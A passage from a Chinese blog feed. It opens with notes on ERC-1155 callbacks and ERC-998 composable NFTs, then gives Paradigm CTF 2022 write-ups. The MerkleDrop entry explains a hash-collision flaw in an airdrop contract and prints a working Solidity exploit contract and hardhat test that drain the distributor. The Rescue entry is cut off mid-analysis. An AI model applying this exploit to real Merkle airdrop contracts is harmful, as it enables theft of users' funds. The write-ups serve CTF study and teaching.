title="回调函数"></a>回调函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function onERC1155BatchReceived(</span><br><span class="line">    address _operator,</span><br><span class="line">    address _from,</span><br><span class="line">    uint256[] calldata _ids,</span><br><span class="line">    uint256[] calldata _values,</span><br><span class="line">    bytes calldata _data</span><br><span class="line">) external returns(bytes4);</span><br></pre></td></tr></table></figure><p>基于 <a href="https://eips.ethereum.org/EIPS/eip-165" target="_blank" rel="noopener">EIP-165</a> 的协议支持，ERC-1155 只支持智能合约的接收回调函数。回调函数必须返回一个事先预定义的 4 字节值，这个值被指定为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bytes4(keccak256(&quot;onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)&quot;))</span><br></pre></td></tr></table></figure><p>当接收合约返回这一值时，意味着合约知道如何处理 ERC-1155 代币并接受转账。 </p><h2 id="ERC998"><a href="#ERC998" class="headerlink" title="ERC998"></a>ERC998</h2><p>ERC-998名叫可拆解非同质化代币（Composable NFT，缩写为CNFT）。它的设计可以让任何一个NFT可以拥有其他NFT或FT。转移CNFT时，就是转移CNFT所拥有的整个层级结构和所属关系。简单来说就是一个ERC-998的物品可以包含多个ERC-721和ERC-20形式的物品。</p><p>举个简单的例子，可以帮助我们更快的理解ERC998到底有什么用。</p><blockquote><p>比如说你想在区块链游戏当中拥有一个角色，那么这个角色本身就是一个基于ERC721的NFT。当你达到一定等级时，一定想要给角色买一些装备，例如衣服等等。但是每一样装备都是一个NFT的话，其实在角色和装备之间，是没有联系的，都是作为单独的NFT存在。</p><p>但是在ERC998出现以后，我们可以把角色看为父token，装备等等都是子token，这样一来，二者便变得不可分割，在交易角色的同时，装备等等也会同时被交易。</p></blockquote><p>我认为，ERC998除了在游戏当中的应用，还可以应用在历史版本迭代等问题上，总之，ERC998的可应用性，还是非常强的。</p><h3 id="简单总结"><a href="#简单总结" class="headerlink" title="简单总结"></a>简单总结</h3><p>ERC-721标准的扩展，使ERC721代币能够拥有其他ERC721代币和<a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-721.md" target="_blank" rel="noopener">ERC20</a>代币。</p><p>ERC-20和<a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md" target="_blank" rel="noopener">ERC-223</a>标准的扩展，使ERC20和ERC223代币由<a href="https://github.com/ethereum/EIPs/issues/223" target="_blank" rel="noopener">ERC721</a>代币拥有。</p><p>此规范涵盖四种不同类型的可组合令牌：</p><ol><li>ERC998ERC721 自上而下的可组合代币是一种 ERC721 代币，具有用于拥有其他 ERC721 代币的附加功能。</li><li>ERC998ERC20 自上而下的可组合代币是一种 ERC721 代币，具有拥有 ERC20 代币的附加功能。</li><li>ERC998ERC721自下而上可组合的代币是一种ERC721代币，具有由ERC721代币拥有的附加功能。</li><li>ERC998ERC20自下而上可组合的ERC20代币具有ERC721代币拥有的附加功能。</li></ol><p>开发时如何选择这四种类型的可组合令牌呢？</p><ul><li><p>如果您想将常规 ERC721 代币转移到不可替代代币，请使用自上而下的可组合代币。</p></li><li><p>如果您想将不可替代的代币转移到常规的ERC721代币，请使用自下而上的可组合代币。</p></li></ul><p>ERC-998的结构中包含两种映射关系，父tokenID映射到子token合约地址。当子token是NFT/FT时，子合约地址映射到对应的子tokenID/余额。 也就是说对于子ERC-721 token，ERC-998会追踪tokenID，而对于ERC-20 token，ERC-998会追踪token数量。 这种内部记账将有助于确保不拥有父token的人无法转移子token。</p>]]></content>
      
      
      <categories>
          
          <category> EIP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> EIP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Paradigm 题解 MerkleDrop</title>
      <link href="/paradigm22-merkleDrop/"/>
      <url>/paradigm22-merkleDrop/</url>
      
        <content type="html"><![CDATA[<h1 id="paradigm-2022-ctf-题解——MerkleDrop"><a href="#paradigm-2022-ctf-题解——MerkleDrop" class="headerlink" title="paradigm 2022 ctf 题解——MerkleDrop"></a>paradigm 2022 ctf 题解——MerkleDrop</h1><hr><pre><code>author：Thomas_Xu</code></pre><p><strong>环境配置</strong>:<br>由于题目环境需要使用docker，环境配置有点繁琐。我重新搭了一个hardhat框架的测试环境,而由于题目出在以太坊的主链上,并使用<code>Alchemy</code>fork了一个主网节点进行测试</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>首先先来看一下这道题目的描述<code>Were you whitelisted?</code>你是否在白名单里？显而易见，这是一道关于空头白名单的问题。而题目给我们提供了64个叶子节点的验证信息，其中包括每个用户地址对应的 <code>index</code>，<code>amount</code> 以及 <code>proof</code> 验证hash。用户可以凭此文件中的相关 Proofs 到合约中 Claim 相应数量的 Token。似乎我们要通过某种漏洞来获取白名单权限，我们进入到<code>Setup</code>中去看判断条件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function isSolved() public view returns (bool) &#123;</span><br><span class="line">        bool condition1 &#x3D; token.balanceOf(address(merkleDistributor)) &#x3D;&#x3D; 0;</span><br><span class="line">        bool condition2 &#x3D; false;</span><br><span class="line">        for (uint256 i &#x3D; 0; i &lt; 64; ++i) &#123;</span><br><span class="line">            if (!merkleDistributor.isClaimed(i)) &#123;</span><br><span class="line">                condition2 &#x3D; true;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return condition1 &amp;&amp; condition2;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>有两个判题：</p><ul><li>要求领完空投钱包的余额</li><li>要求白名单里至少有1个人没有领空投</li></ul><p>算了一下，json文件中64个地址能领的金额相加刚好等于<code>merkleDistributor</code>中的余额 75 ETH，想要同时完成这两个判题貌似是不可能的事。</p><p>如果是按照标准实现的Merkle Tree我们几乎不可能对其进行攻击。那么让我们来对比一下这里的代码和标准实现的Merkle Tree有什么不同吧。<br><img src="merkledrop_01.jpg" alt=""></p><p>这个<code>uint96</code>是最可疑的地方</p><p>让我们回顾一下MerkleTree的验证过程</p><p><img src="MerkleHash.png" alt=""></p><p>Merkle Tree 的基本原理是依靠叶子节点的值一层层计算出 hash，最终得到 Root 值，验证某一个叶子节点是否在 Merkle Tree 中，只需提供相对应的 Proofs 路径进行计算，观察最终的 Root 值是否一致即可。</p><p>而这个题最巧妙的一点就是：由于<code>amout</code>字段使用了uint96，导致出现了一个巧合。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function claim(uint256 index, address account, uint96 amount, bytes32[] memory merkleProof) external &#123;</span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Verify the merkle proof.</span><br><span class="line">        bytes32 node &#x3D; keccak256(abi.encodePacked(index, account, amount));</span><br><span class="line">        require(MerkleProof.verify(merkleProof, merkleRoot, node), &#39;MerkleDistributor: Invalid proof.&#39;);</span><br><span class="line"></span><br><span class="line">      ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>claim里的node节点hash计算方式是先<code>abi.encodePacked(index, account, amount)</code>再hash。而这里的三个字段为</p><ul><li>index[uint256]: 32bytes</li><li>account[address]:20bytes</li><li>amount[uint96]:12bytes</li></ul><p>这三个字段加起来刚好是64bytes。正好是两个 keccak256 hash 结果拼接在一起的大小。可以看成是其中一个 hash 值作为 index, 另一个 hash 值作为 account + amount。</p><p>那我们就可以利用此巧合去构造一个假的输入，而这个输入可以完美通过hash验证。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>现在的重点就是去构造这个”巧合的哈希“</p><p>空投的总数量为7500个ETH，即0x0fe1c215e8f838e00000，而uint96的最大值为0xffffffffffffffffffffffff，很明显，如果是随机的哈希结果，是会远远大于空投的总数量。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0xffffffffffffffffffffffff</span><br><span class="line">0x00000fe1c215e8f838e00000</span><br></pre></td></tr></table></figure><p>二者至少差了5个0，不过这也给我们提供了一个思路，我们去tree.json搜一下有5个连续0的哈希。</p><p><img src="C:\Users\小栩\Documents\GitHub\Conract_Attack\images\ParadigmCTF\2022\marklejson_serch.png" alt=""></p><p>很容易发现37这个节点</p><p>更巧合的是从第一个0处把这个哈希截断的话，前一部分刚好是20bytes,后一部分刚好是12bytes。换句话说，这个哈希可以被解析为<code>account + amount</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">account: 0xd48451c19959e2D9bD4E620fBE88aA5F6F7eA72A</span><br><span class="line">amount: 0x00000f40f0c122ae08d2207b</span><br></pre></td></tr></table></figure><p>来看看<code>MerkleProof</code>里是怎么验证节点的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">function verify(</span><br><span class="line">    bytes32[] memory proof,</span><br><span class="line">    bytes32 root,</span><br><span class="line">    bytes32 leaf</span><br><span class="line">  )</span><br><span class="line">    internal</span><br><span class="line">    pure</span><br><span class="line">    returns (bool)</span><br><span class="line">  &#123;</span><br><span class="line">    bytes32 computedHash &#x3D; leaf;</span><br><span class="line"></span><br><span class="line">    for (uint256 i &#x3D; 0; i &lt; proof.length; i++) &#123;</span><br><span class="line">      bytes32 proofElement &#x3D; proof[i];</span><br><span class="line"></span><br><span class="line">      if (computedHash &lt; proofElement) &#123;</span><br><span class="line">        &#x2F;&#x2F; Hash(current computed hash + current element of the proof)</span><br><span class="line">        computedHash &#x3D; keccak256(abi.encodePacked(computedHash, proofElement));</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        &#x2F;&#x2F; Hash(current element of the proof + current computed hash)</span><br><span class="line">        computedHash &#x3D; keccak256(abi.encodePacked(proofElement, computedHash));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Check if the computed hash (root) is equal to the provided root</span><br><span class="line">    return computedHash &#x3D;&#x3D; root;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实验证过程和merkletree的标准实现一样，将叶子节点和验证节点自下而上，两两哈希拼接在一起后再取哈希，最终和root哈希比较是否相等。</p><p>那么由于之前的巧合，我们可以通过index为37节点的第一个proof节点为突破口。</p><blockquote><p>由于验证过程的第一次验证（被验证节点和第一个proof节点hex）也是需要37号节点的哈希和我们的“突破口”哈希拼接后再取哈希进行后面的操作。</p><p>那么我们就可以在第一次验证的这个点做文章了</p></blockquote><p>我们回过头来看一看<code>claim</code>函数里面是怎么计算的节点哈希：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bytes32 node &#x3D; keccak256(abi.encodePacked(index, account, amount));</span><br></pre></td></tr></table></figure><p>之前讲到，<code>index</code>可以看作前哈希，<code>account</code>和<code>amount</code>可以看作后哈希，那么我们就可以直接构造出第一次验证时的拼接。</p><p>也就是说我们可以完美的用“意外”的参数通过验证。</p><p>但此时<code>account</code>为<code>0xd48451c19959e2D9bD4E620fBE88aA5F6F7eA72A</code>,amount为<code>0x00000f40f0c122ae08d2207b</code>这都是意外的参数。而<code>amount</code>换算之后刚好小于75</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">计算一下还剩多少token未领</span><br><span class="line">0x0fe1c215e8f838e00000 - 0x00000f40f0c122ae08d2207b &#x3D; </span><br><span class="line">0xa0d154c64a300ddf85</span><br></pre></td></tr></table></figure><p>而这个amout刚好与index为8的节点amout相同，那么只要通过这个叶子节点，就可以领完空投合约里的所有token，解决本题。</p><p>附exploit合约</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">contract Exploit &#123;</span><br><span class="line">    constructor(Setup setup) &#123;</span><br><span class="line">        MerkleDistributor merkleDistributor &#x3D; setup.merkleDistributor();</span><br><span class="line">        </span><br><span class="line">        &#x2F;&#x2F;通过拼接哈希，跳过第一个验证节点。</span><br><span class="line">        bytes32[] memory merkleProof1 &#x3D; new bytes32[](5);</span><br><span class="line">        merkleProof1[0] &#x3D; bytes32(0x8920c10a5317ecff2d0de2150d5d18f01cb53a377f4c29a9656785a22a680d1d);</span><br><span class="line">        merkleProof1[1] &#x3D; bytes32(0xc999b0a9763c737361256ccc81801b6f759e725e115e4a10aa07e63d27033fde);</span><br><span class="line">        merkleProof1[2] &#x3D; bytes32(0x842f0da95edb7b8dca299f71c33d4e4ecbb37c2301220f6e17eef76c5f386813);</span><br><span class="line">        merkleProof1[3] &#x3D; bytes32(0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c);</span><br><span class="line">        merkleProof1[4] &#x3D; bytes32(0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5);</span><br><span class="line">        merkleDistributor.claim(</span><br><span class="line">                0xd43194becc149ad7bf6db88a0ae8a6622e369b3367ba2cc97ba1ea28c407c442, </span><br><span class="line">                address(0x00d48451c19959e2d9bd4e620fbe88aa5f6f7ea72a), </span><br><span class="line">                0x00000f40f0c122ae08d2207b,</span><br><span class="line">                merkleProof1</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;用index 8取完剩下的token即可</span><br><span class="line">        bytes32[] memory merkleProof2 &#x3D; new bytes32[](6);</span><br><span class="line">        merkleProof2[0] &#x3D; bytes32(0xe10102068cab128ad732ed1a8f53922f78f0acdca6aa82a072e02a77d343be00);</span><br><span class="line">        merkleProof2[1] &#x3D; bytes32(0xd779d1890bba630ee282997e511c09575fae6af79d88ae89a7a850a3eb2876b3);</span><br><span class="line">        merkleProof2[2] &#x3D; bytes32(0x46b46a28fab615ab202ace89e215576e28ed0ee55f5f6b5e36d7ce9b0d1feda2);</span><br><span class="line">        merkleProof2[3] &#x3D; bytes32(0xabde46c0e277501c050793f072f0759904f6b2b8e94023efb7fc9112f366374a);</span><br><span class="line">        merkleProof2[4] &#x3D; bytes32(0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c);</span><br><span class="line">        merkleProof2[5] &#x3D; bytes32(0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5);</span><br><span class="line">        merkleDistributor.claim(8, address(0x249934e4C5b838F920883a9f3ceC255C0aB3f827), 0xa0d154c64a300ddf85, merkleProof2);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>附hardhat测试用例</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; expect &#125; = <span class="built_in">require</span>(<span class="string">"chai"</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; ethers &#125; = <span class="built_in">require</span>(<span class="string">'hardhat'</span>);</span><br><span class="line">describe(<span class="string">"Challange merkleDrop"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> attacker,deployer;</span><br><span class="line">    it(<span class="string">"should return the solved"</span>, <span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        [attacker,deployer] = <span class="keyword">await</span> ethers.getSigners();</span><br><span class="line">        <span class="keyword">const</span> SetupFactory = <span class="keyword">await</span> ethers.getContractFactory(<span class="string">"MerkleSetup"</span>, attacker);</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">const</span> setup = <span class="keyword">await</span> SetupFactory.deploy(&#123;</span><br><span class="line">            value: ethers.utils.parseEther(<span class="string">"75"</span>)</span><br><span class="line">        &#125;);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//Exploit</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> ExploitFactory = <span class="keyword">await</span> ethers.getContractFactory(<span class="string">"MerkleDropExploit"</span>,attacker);</span><br><span class="line">        <span class="keyword">await</span> ExploitFactory.deploy(setup.address);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        expect(<span class="keyword">await</span> setup.isSolved()).to.equal(<span class="literal">true</span>);</span><br><span class="line">        </span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Paradigm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Paradigm 题解 Rescue</title>
      <link href="/paradigm22-rescue/"/>
      <url>/paradigm22-rescue/</url>
      
        <content type="html"><![CDATA[<h1 id="paradigm-2022-ctf-题解——Rescue"><a href="#paradigm-2022-ctf-题解——Rescue" class="headerlink" title="paradigm 2022 ctf 题解——Rescue"></a>paradigm 2022 ctf 题解——Rescue</h1><hr><pre><code>author：Thomas_Xu</code></pre><p><strong>环境配置</strong>:<br>由于题目环境需要使用docker，环境配置有点繁琐。我重新搭了一个hardhat框架的测试环境,而由于题目出在以太坊的主链上,并使用<code>Alchemy</code>fork了一个主网节点进行测试.</p><h2 id="Resucue"><a href="#Resucue" class="headerlink" title="Resucue"></a>Resucue</h2><p>首先先来看一下这道题目的描述:<code>I accidentally sent some WETH to a contract, can you help me?</code>看起来像是由于操作失误,导致像一个合约转了一些ETH,想要完成此Challange就必须试图挽救一下这笔损失.<br>接下来看一看合约代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: UNLICENSED</span><br><span class="line"></span><br><span class="line">pragma solidity 0.8.16;</span><br><span class="line"></span><br><span class="line">import &quot;.&#x2F;MasterChefHelper.sol&quot;;</span><br><span class="line">interface WETH9 is ERC20Like &#123;</span><br><span class="line">    function deposit() external payable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Setup &#123;</span><br><span class="line">    </span><br><span class="line">    WETH9 public constant weth &#x3D; WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);</span><br><span class="line">    MasterChefHelper public immutable mcHelper;</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;</span><br><span class="line">        mcHelper &#x3D; new MasterChefHelper();</span><br><span class="line">        weth.deposit&#123;value: 10 ether&#125;();</span><br><span class="line">        weth.transfer(address(mcHelper), 10 ether); &#x2F;&#x2F; whoops</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() external view returns (bool) &#123;</span><br><span class="line">        return weth.balanceOf(address(mcHelper)) &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是<code>Setup</code>合约,从中我们可以获取以下信息:</p><ol><li>我们不小心向<code>mcHelper</code>合约转了10 <code>ether</code></li><li>完成Challange的条件是要求<code>mcHelper</code>合约里没有这笔钱<code>return weth.balanceOf(address(mcHelper)) == 0;</code><br>所以我们可能并不是要做到把这笔钱转回到我们账户上,而是只需要使这10个ETH从<code>mcHelper</code>消失即可.</li></ol><p>有了上面的分析,似乎已经有了眉目,接下来分析<code>MasterChefLike</code>合约:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: UNLICENSED</span><br><span class="line"></span><br><span class="line">pragma solidity 0.8.16;</span><br><span class="line"></span><br><span class="line">import &quot;.&#x2F;UniswapV2Like.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface ERC20Like &#123;</span><br><span class="line">    function transferFrom(address, address, uint) external;</span><br><span class="line">    function transfer(address, uint) external;</span><br><span class="line">    function approve(address, uint) external;</span><br><span class="line">    function balanceOf(address) external view returns (uint);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface MasterChefLike &#123;</span><br><span class="line">    function poolInfo(uint256 id) external returns (</span><br><span class="line">        address lpToken,</span><br><span class="line">        uint256 allocPoint,</span><br><span class="line">        uint256 lastRewardBlock,</span><br><span class="line">        uint256 accSushiPerShare</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract MasterChefHelper &#123;</span><br><span class="line"></span><br><span class="line">    MasterChefLike public constant masterchef &#x3D; MasterChefLike(0xc2EdaD668740f1aA35E4D8f227fB8E17dcA888Cd);</span><br><span class="line">    UniswapV2RouterLike public constant router &#x3D; UniswapV2RouterLike(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);</span><br><span class="line"></span><br><span class="line">    function swapTokenForPoolToken(uint256 poolId, address tokenIn, uint256 amountIn, uint256 minAmountOut) external &#123;</span><br><span class="line">        (address lpToken,,,) &#x3D; masterchef.poolInfo(poolId);</span><br><span class="line">        address tokenOut0 &#x3D; UniswapV2PairLike(lpToken).token0();</span><br><span class="line">        address tokenOut1 &#x3D; UniswapV2PairLike(lpToken).token1();</span><br><span class="line"></span><br><span class="line">        ERC20Like(tokenIn).approve(address(router), type(uint256).max);</span><br><span class="line">        ERC20Like(tokenOut0).approve(address(router), type(uint256).max);</span><br><span class="line">        ERC20Like(tokenOut1).approve(address(router), type(uint256).max);</span><br><span class="line">        ERC20Like(tokenIn).transferFrom(msg.sender, address(this), amountIn);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; swap for both tokens of the lp pool</span><br><span class="line">        _swap(tokenIn, tokenOut0, amountIn &#x2F; 2);</span><br><span class="line">        _swap(tokenIn, tokenOut1, amountIn &#x2F; 2);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; add liquidity and give lp tokens to msg.sender</span><br><span class="line">        _addLiquidity(tokenOut0, tokenOut1, minAmountOut);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _addLiquidity(address token0, address token1, uint256 minAmountOut) internal &#123;</span><br><span class="line">        (,, uint256 amountOut) &#x3D; router.addLiquidity(</span><br><span class="line">            token0, </span><br><span class="line">            token1, </span><br><span class="line">            ERC20Like(token0).balanceOf(address(this)), </span><br><span class="line">            ERC20Like(token1).balanceOf(address(this)),             &#x2F;&#x2F;WETH</span><br><span class="line">            0, </span><br><span class="line">            0, </span><br><span class="line">            msg.sender, </span><br><span class="line">            block.timestamp</span><br><span class="line">        );</span><br><span class="line">        require(amountOut &gt;&#x3D; minAmountOut);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _swap(address tokenIn, address tokenOut, uint256 amountIn) internal &#123;</span><br><span class="line">        address[] memory path &#x3D; new address[](2);</span><br><span class="line">        path[0] &#x3D; tokenIn;</span><br><span class="line">        path[1] &#x3D; tokenOut;</span><br><span class="line">        router.swapExactTokensForTokens(</span><br><span class="line">            amountIn,</span><br><span class="line">            0,</span><br><span class="line">            path,</span><br><span class="line">            address(this),</span><br><span class="line">            block.timestamp</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这个合约只有一个外部调用函数:<code>swapTokenForPoolToken()</code>所以我们可以集中目光研究此函数即可.<br>接下来我们一步一步分析这个函数:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function swapTokenForPoolToken(uint256 poolId, address tokenIn, uint256 amountIn, uint256 minAmountOut) external &#123;</span><br><span class="line">        (address lpToken,,,) &#x3D; masterchef.poolInfo(poolId);&#x2F;&#x2F;获取poolId对应交易池</span><br><span class="line">        address tokenOut0 &#x3D; UniswapV2PairLike(lpToken).token0();&#x2F;&#x2F;获取交易池对应的token</span><br><span class="line">        address tokenOut1 &#x3D; UniswapV2PairLike(lpToken).token1();</span><br><span class="line"></span><br><span class="line">        ERC20Like(tokenIn).approve(address(router), type(uint256).max);&#x2F;&#x2F;每个token都给router授权</span><br><span class="line">        ERC20Like(tokenOut0).approve(address(router), type(uint256).max);</span><br><span class="line">        ERC20Like(tokenOut1).approve(address(router), type(uint256).max);</span><br><span class="line">        ERC20Like(tokenIn).transferFrom(msg.sender, address(this), amountIn);&#x2F;&#x2F;将要兑换的Weth发送到此合约</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; swap for both tokens of the lp pool</span><br><span class="line">        _swap(tokenIn, tokenOut0, amountIn &#x2F; 2);&#x2F;&#x2F;将兑换的Weth分别交换为两种token</span><br><span class="line">        _swap(tokenIn, tokenOut1, amountIn &#x2F; 2);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; add liquidity and give lp tokens to msg.sender</span><br><span class="line">        _addLiquidity(tokenOut0, tokenOut1, 